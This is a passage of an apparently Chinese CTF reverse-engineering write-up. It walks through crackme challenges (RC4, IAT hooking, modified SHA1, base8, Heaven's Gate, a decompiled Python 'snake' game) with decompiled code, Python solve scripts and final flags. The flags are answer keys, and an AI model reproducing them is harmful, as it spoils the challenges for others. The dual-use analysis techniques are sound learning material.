((<span class="built_in">void</span> (*)(<span class="type">int</span>, ...))sub_401446)(<span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, v6, <span class="number">0</span>, <span class="number">0x80000004</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">    <span class="built_in">sub_401440</span>(v11);</span><br><span class="line">  <span class="keyword">if</span> ( lpMem )</span><br><span class="line">    <span class="built_in">sub_401440</span>(lpMem);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>动调+静态瞎搞一通<br>sub_401446发现是类似回调函数这种<br>然后学到了一个点: 在汇编中看可以看到回调的函数!<br>以len&#x3D;38那儿为例:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401110</span>                 push    eax</span><br><span class="line">.text:<span class="number">00401111</span>                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">00401116</span>                 mov     ebx, offset sub_401590</span><br><span class="line">.text:<span class="number">0040111B</span>                 call    sub_401446</span><br><span class="line">.text:<span class="number">00401120</span>                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">00401123</span>                 mov     [ebp+var_C], eax</span><br><span class="line">.text:<span class="number">00401126</span>                 jmp     <span class="type">short</span> loc_401129</span><br></pre></td></tr></table></figure><p>汇编中可以看到 mov     ebx, offset sub_401590<br>这个sub_401590就是gets和strlen!<br>有些师傅的IDA给显示出来了 我的是没显示的 但也不是很影响</p><p>虽然但是 这IDA好多识别不对啊…<br>能找到enc点 在这里</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_40144C</span>(<span class="number">3</span>, (<span class="type">char</span>)v3, <span class="number">0</span>, <span class="number">0x80000005</span>, v7, <span class="number">0</span>, <span class="number">0x80000004</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0x80000301</span>);<span class="comment">// enc</span></span><br></pre></td></tr></table></figure><p>跟进查看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 != <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">sub_45A100</span>(a2[<span class="number">3</span>], <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)a2[<span class="number">3</span>]), RC4_KEY);<span class="comment">// RC4预处理</span></span><br><span class="line">  v7 = <span class="built_in">malloc</span>(v5);</span><br><span class="line">  v13 = v7;</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">qmemcpy</span>(v7, v4, v5);</span><br><span class="line">    v12 = v5;</span><br><span class="line">    <span class="built_in">sub_45A1D0</span>((<span class="type">int</span>)v7, v5, (<span class="type">int</span>)RC4_KEY);    <span class="comment">// 类RC4</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是个RC4 预处理可以直接动调提取出表<br>关键在于找到加密后的check点！<br>真没找到…<br>看网上唯一一篇wp也没复现成功<br>就先借数据吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">enc = [0x56, 0xEC,</span><br><span class="line">0xA0, 0xDC, 0x57, 0x07, 0xF4, 0xA3, 0xE9, 0x77, 0xBF, 0x93,</span><br><span class="line">0xBC, 0x86, 0x52, 0xA5, 0x14, 0x6A, 0xA5, 0xBD, 0xB5, 0xD2,</span><br><span class="line">0x7F, 0x0B, 0x9B, 0x67, 0x1D, 0x08, 0xEF, 0xC9, 0x32, 0x5D,</span><br><span class="line">0x43, 0xED, 0x1E, 0x01, 0x4B, 0x7B]</span><br></pre></td></tr></table></figure><p>最后解出<br><strong>flag{08360c3f9f994e199427d9c7ed14ef23}</strong></p><hr><hr><p>IDA瞎翻还真能翻到…<br>unk_4804C3处就是enc数组</p><p>交叉引用找到唯一一处</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">00401249</span></span><br><span class="line">.text:<span class="number">00401249</span> loc_401249:                             ; CODE XREF: sub_4010B0+<span class="number">196</span>↑j</span><br><span class="line">.text:<span class="number">00401249</span>                 mov     eax, offset unk_4804C3</span><br><span class="line">.text:<span class="number">0040124</span>E                 <span class="keyword">xor</span>     ecx, ecx</span><br><span class="line">.text:<span class="number">00401250</span>                 test    eax, eax</span><br><span class="line">.text:<span class="number">00401252</span>                 jz      <span class="type">short</span> loc_401257</span><br><span class="line">.text:<span class="number">00401254</span>                 mov     ecx, [eax+<span class="number">4</span>]</span><br></pre></td></tr></table></figure><p>但这前后也看不出任何check的逻辑啊…<br>日后再来逆吧…</p><h1 id="西湖论剑2022"><a href="#西湖论剑2022" class="headerlink" title="西湖论剑2022"></a>西湖论剑2022</h1><h2 id="EasyVT"><a href="#EasyVT" class="headerlink" title="EasyVT"></a>EasyVT</h2><a href="/VT%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" title="VT处理器虚拟化技术学习">VT</a><h2 id="babyRe"><a href="#babyRe" class="headerlink" title="babyRe"></a>babyRe</h2><p>考点:<br>IAT表hook + sha1 + base8 + RC4</p><p>学习:</p><ul><li><a href="https://equinox-shame.github.io/2023/03/01/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%20BabyRe%20%E5%A4%8D%E7%8E%B0/#">+</a></li><li><a href="https://www.ctfiot.com/97742.html">++</a></li></ul><p>开局一个奇奇怪怪的main 只调用了一个GetLastError<br>翻string跟踪input 能找到</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rdata:<span class="number">00406164</span>                 dd offset sub_401000</span><br><span class="line">.rdata:<span class="number">00406168</span>                 dd offset sub_401050</span><br><span class="line">.rdata:<span class="number">0040616</span>C                 dd offset sub_4010A0</span><br></pre></td></tr></table></figure><p>每个里面都是先调用一个函数 然后在atexit里又调用另一个函数<br>猜测atexit的顺序是栈 也就是这三个函数的第一个调用完了后再从里到外调用atexit<br>在这3*2+main这7个函数下断点<br>顺序:<br>1170-&gt;1230-&gt;12B0-&gt;main-&gt;1670 因为不符合check直接退了 但也能印证猜测 所以<br>1170-&gt;1230-&gt;12B0-&gt;main-&gt;1670-&gt;15C0-&gt;10E0<br>挨个看<br>1170:<br>input and check is_digit</p><p>1230:<br>set table</p><p>12B0:<br>重点!<br><img src="https://s2.loli.net/2024/01/24/wjebRFKkmsa3dL7.png" alt="IAT_HOOK.png"></p><p>也就是说这里把IAT表中GetLastError替换成了sub_4019D0<br>所以接下来的main相当于调用sub_4019D0</p><p>这里的分析是可以通过LoadLibrary和”GetLastError”以及对应指针的替换看出来的(做题角度并不一定要分析到IAT这么准确)</p><p>19D0:<br>覆盖sha1的常量值</p><p>1670:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">sub_401670</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4090A2);</span><br><span class="line">  <span class="built_in">sub_401720</span>(INPUT, (<span class="type">int</span>)&amp;unk_4081C0);          <span class="comment">// base8</span></span><br><span class="line">  result = <span class="built_in">memcmp</span>(&amp;unk_4081D0, a16230465152334, <span class="number">0x60</span>u);<span class="comment">// base8加密后的enc的[16:] 说明前6位flag未知</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对input base8加密<br>注意到enc是存入&amp;4081C0 而后面的check是&amp;4081D0开始的0x60个<br>所以enc的[:16]是没有验证的 对应就是Input[:6]是不知道的 (base8 pt和ct的bit关系: 3-&gt;8)</p><p>15C0:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4015C0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4090A2);</span><br><span class="line">  <span class="built_in">sha1_sub_401CC0</span>((<span class="type">int</span>)&amp;unk_4081C0, <span class="number">112</span>, <span class="number">0</span>, Buffer);<span class="comment">// 对base8加密的enc[:16] sha1 </span></span><br><span class="line">  result = <span class="built_in">memcmp</span>(Buffer, a67339fc92b4875, <span class="number">0x28</span>u);<span class="comment">// 67339fc92b4875b8c073c76994ef1ca4ce632d26 这里能还原flag[:6]</span></span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>sha1<br>注意这里从&amp;4081C0开始取112个字符 也就是base8加密后的enc[:112]<br>所以是可以通过这里还原flag[:6] 只是sha1是魔改过的…</p><p>14E0:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_4014E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [esp+0h] [ebp-E8h]</span></span><br><span class="line"></span><br><span class="line">  __CheckForDebuggerJustMyCode(&amp;unk_4090A2);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;unk_4084C0, &amp;unk_4081C0, <span class="number">0x70</span>u);</span><br><span class="line">  <span class="built_in">sub_401B60</span>(&amp;unk_4083C0, &amp;unk_408182, <span class="number">6</span>);      <span class="comment">// RC4 input从408158开始 这里的RC4key就取的是flag的最后6位</span></span><br><span class="line">  <span class="built_in">sub_401A40</span>(&amp;unk_4083C0, &amp;unk_4084C0, <span class="number">112</span>);    <span class="comment">// 4084C0取的是base8加密的enc的前112个字符</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(&amp;unk_4084C0, &amp;unk_408090, <span class="number">0x70</span>u) )</span><br><span class="line">    <span class="built_in">ExitProcess</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_4025A0</span>(<span class="string">&quot;Good, flag is DASCTF&#123;your input&#125;&quot;</span>, v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面的input是重命名过的 真实地址是408158 可以大致算算前面一共得到了6+36&#x3D;42&#x3D;2Ah的flag<br>刚好58+2A&#x3D;82 所以这里就是取得flag末6位作为RC4的key 然后取base8加密enc[:112]</p><p>整体分析完了 接下来就是如何逆向<br>flag[6:-6]可以直接<a href="https://try8.cn/tool/code/base8#google_vignette">在线网站</a>解base8<br>注意到flag[-6:]是作为key  那么我们可以爆破这个key 根据密文反解RC4同时check is_digit来筛选key<br>理论上key的可能值应该就不多了 然后结合RC4还原的明文与flag[6:-6]比较 因为112-&gt;42 所以RC4还原的应该多出前6位<br>那么RC4_DEC+key就是flag了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">enc = [<span class="number">0x3F</span>, <span class="number">0x95</span>, <span class="number">0xBB</span>, <span class="number">0xF2</span>, <span class="number">0x57</span>, <span class="number">0xF1</span>, <span class="number">0x7A</span>, <span class="number">0x5A</span>, <span class="number">0x22</span>, <span class="number">0x61</span>, <span class="number">0x51</span>, <span class="number">0x43</span>, <span class="number">0xA2</span>, <span class="number">0xFA</span>, <span class="number">0x9B</span>, <span class="number">0x6F</span>, <span class="number">0x44</span>, <span class="number">0x63</span>, <span class="number">0xC0</span>, <span class="number">0x08</span>, <span class="number">0x12</span>, <span class="number">0x65</span>, <span class="number">0x5C</span>, <span class="number">0x8A</span>, <span class="number">0x8C</span>, <span class="number">0x4C</span>, <span class="number">0xED</span>, <span class="number">0x5E</span>, <span class="number">0xCA</span>, <span class="number">0x76</span>, <span class="number">0xB9</span>, <span class="number">0x85</span>, <span class="number">0xAF</span>, <span class="number">0x05</span>, <span class="number">0x38</span>, <span class="number">0xED</span>, <span class="number">0x42</span>, <span class="number">0x3E</span>, <span class="number">0x42</span>, <span class="number">0xDF</span>, <span class="number">0x5D</span>, <span class="number">0xBE</span>, <span class="number">0x05</span>, <span class="number">0x8B</span>, <span class="number">0x35</span>, <span class="number">0x6D</span>, <span class="number">0xF3</span>, <span class="number">0x1C</span>, <span class="number">0xCF</span>, <span class="number">0xF8</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x25</span>, <span class="number">0xE4</span>, <span class="number">0xB7</span>, <span class="number">0xB9</span>, <span class="number">0x36</span>, <span class="number">0xFB</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0xA0</span>, <span class="number">0xF0</span>, <span class="number">0x57</span>, <span class="number">0xAB</span>, <span class="number">0x21</span>, <span class="number">0xC6</span>, <span class="number">0xC7</span>, <span class="number">0x46</span>, <span class="number">0x99</span>, <span class="number">0xBD</span>, <span class="number">0x1E</span>, <span class="number">0x61</span>, <span class="number">0x5E</span>, <span class="number">0xEE</span>, <span class="number">0x55</span>, <span class="number">0x18</span>, <span class="number">0xEE</span>, <span class="number">0x03</span>, <span class="number">0x29</span>, <span class="number">0x84</span>, <span class="number">0x7F</span>, <span class="number">0x94</span>, <span class="number">0x5F</span>, <span class="number">0xB4</span>, <span class="number">0x6A</span>, <span class="number">0x29</span>, <span class="number">0xD8</span>, <span class="number">0x6C</span>, <span class="number">0xE4</span>, <span class="number">0xC0</span>, <span class="number">0x9D</span>, <span class="number">0x6B</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x94</span>, <span class="number">0x5C</span>, <span class="number">0xDD</span>, <span class="number">0xCC</span>, <span class="number">0xD5</span>, <span class="number">0x3D</span>, <span class="number">0xC0</span>, <span class="number">0xEF</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0xE5</span>, <span class="number">0xB0</span>, <span class="number">0x93</span>, <span class="number">0xF1</span>, <span class="number">0xB3</span>, <span class="number">0xDE</span>, <span class="number">0xB0</span>, <span class="number">0x70</span>]</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1000000</span>):</span><br><span class="line">    rc4 = ARC4.new(<span class="built_in">str</span>(i).zfill(<span class="number">6</span>).encode())</span><br><span class="line">    pt = rc4.decrypt(<span class="built_in">bytes</span>(enc))</span><br><span class="line">    <span class="keyword">if</span> pt.isdigit():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;key = &quot;</span>,i)</span><br><span class="line">        <span class="built_in">print</span>(pt)</span><br></pre></td></tr></table></figure><p>得到key&#x3D;807391 对应RC4_DEC&#x3D;561516915572239428449843076691286116796614 拼接得到flag<br><strong>DASCTF{561516915572239428449843076691286116796614807391}</strong></p><h2 id="DualPersonality"><a href="#DualPersonality" class="headerlink" title="DualPersonality"></a>DualPersonality</h2><p>参考:</p><ul><li><a href="https://www.fup1p1.cn/archives/reverse2022%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%A4%8D%E7%8E%B0">+</a></li></ul><p>32位和64位的切换 天堂之门<br>直接静态nop掉0数据后F5<br>main:<br><img src="/Reverse-Other/images/image.png" alt="main"></p><p>可以看出开始作了一个xor加密 只是这里的v3我一直找不到 静态&#x2F;动调都找不出来…<br>继续看汇编<br><img src="/Reverse-Other/images/image-1.png" alt="401455"><br><img src="/Reverse-Other/images/image-2.png" alt="40700C"></p><p>相当于是调用了401200处<br><img src="/Reverse-Other/images/image-3.png" alt="401200"></p><p>这里是因为我用的32分析所以是ROL4 但这里是64位的 所以应该是ROL8 但不影响 知道是算术左移就行 然后64位应该走else分支</p><p>然后main下面的<code>if ( !sub_401120(7u, (int)&amp;loc_401290) )</code><br>调用了<br><img src="/Reverse-Other/images/image-4.png" alt="401290"></p><p>要注意到这里的407014是后面最后一次加密的key值</p><p>然后就是最后一次加密 简单的xor key是经过上面函数修改后的</p><p>程序多次切换32&#x2F;64 所以数据处理要注意!!! 一定要zfill(2)啊啊啊！！！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp ... 难绷</span></span><br><span class="line">enc = [<span class="number">0xAA</span>, <span class="number">0x4F</span>, <span class="number">0x0F</span>, <span class="number">0xE2</span>, <span class="number">0xE4</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x54</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x84</span>, <span class="number">0x7E</span>, <span class="number">0xBC</span>, <span class="number">0x8F</span>, <span class="number">0x8B</span>, <span class="number">0x78</span>, <span class="number">0xD3</span>, <span class="number">0x73</span>, <span class="number">0x88</span>, <span class="number">0x5E</span>, <span class="number">0xAE</span>, <span class="number">0x47</span>, <span class="number">0x85</span>, <span class="number">0x70</span>, <span class="number">0x31</span>, <span class="number">0xB3</span>,<span class="number">0x09</span>, <span class="number">0xCE</span>, <span class="number">0x13</span>, <span class="number">0xF5</span>, <span class="number">0x0D</span>, <span class="number">0xCA</span>]</span><br><span class="line">key = [<span class="number">0x9D</span>,<span class="number">0x44</span>,<span class="number">0x37</span>,<span class="number">0xB5</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encodekey</span>():</span><br><span class="line">    key[<span class="number">0</span>] &amp;= key[<span class="number">1</span>]</span><br><span class="line">    key[<span class="number">1</span>] |= key[<span class="number">2</span>]</span><br><span class="line">    key[<span class="number">2</span>] ^= key[<span class="number">3</span>]</span><br><span class="line">    key[<span class="number">3</span>] = (~key[<span class="number">3</span>])&amp;<span class="number">0xff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dec1</span>(): <span class="comment"># decode enc4</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        enc[i] ^= key[i%<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ROR</span>(<span class="params">x,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (x&gt;&gt;n|(x&lt;&lt;(<span class="number">64</span>-n)))&amp;<span class="number">0xffffffffffffffff</span> </span><br><span class="line">    </span><br><span class="line">encodekey()</span><br><span class="line">dec1()</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> enc:</span><br><span class="line">    s.append(<span class="built_in">hex</span>(c)[<span class="number">2</span>:].zfill(<span class="number">2</span>)) <span class="comment"># !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</span></span><br><span class="line">enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    ss = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        ss += s[i*<span class="number">8</span>+<span class="number">7</span>-j]</span><br><span class="line">    enc.append(ss)</span><br><span class="line">enc = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> enc]</span><br><span class="line">enc[<span class="number">0</span>] = ROR(enc[<span class="number">0</span>],<span class="number">12</span>)</span><br><span class="line">enc[<span class="number">1</span>] = ROR(enc[<span class="number">1</span>],<span class="number">34</span>)</span><br><span class="line">enc[<span class="number">2</span>] = ROR(enc[<span class="number">2</span>],<span class="number">56</span>)</span><br><span class="line">enc[<span class="number">3</span>] = ROR(enc[<span class="number">3</span>],<span class="number">14</span>)</span><br><span class="line">final_enc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    x = enc[i]&amp;<span class="number">0x00000000ffffffff</span></span><br><span class="line">    final_enc.append(x)</span><br><span class="line">    x = enc[i]&amp;<span class="number">0xffffffff00000000</span></span><br><span class="line">    x &gt;&gt;= <span class="number">32</span></span><br><span class="line">    final_enc.append(x)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">v3 = <span class="number">0x5DF966AE</span></span><br><span class="line">d = v3 - <span class="number">0x21524111</span></span><br><span class="line">pt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    d &amp;= <span class="number">0xffffffff</span></span><br><span class="line">    pt.append((final_enc[i]-d)&amp;<span class="number">0xffffffff</span>)</span><br><span class="line">    d ^= final_enc[i]</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] ANS&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> pt:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(c).decode()[::-<span class="number">1</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><p><strong>DASCTF{6cc1e44811647d38a15017e389b3f704}</strong></p><h1 id="未知来源"><a href="#未知来源" class="headerlink" title="未知来源"></a>未知来源</h1><h2 id="ctfshow-reverse-比赛原题-snake"><a href="#ctfshow-reverse-比赛原题-snake" class="headerlink" title="ctfshow-reverse-比赛原题-snake"></a>ctfshow-reverse-比赛原题-snake</h2><p>py反编译</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 3.7.0 (3394)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.12 (default, Feb  9 2021, 09:19:15) </span></span><br><span class="line"><span class="comment"># [GCC 8.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: snake.py</span></span><br><span class="line"><span class="keyword">import</span> hashlib, sys, random, time</span><br><span class="line">maze = [</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>],</span><br><span class="line"> [</span><br><span class="line">  <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span 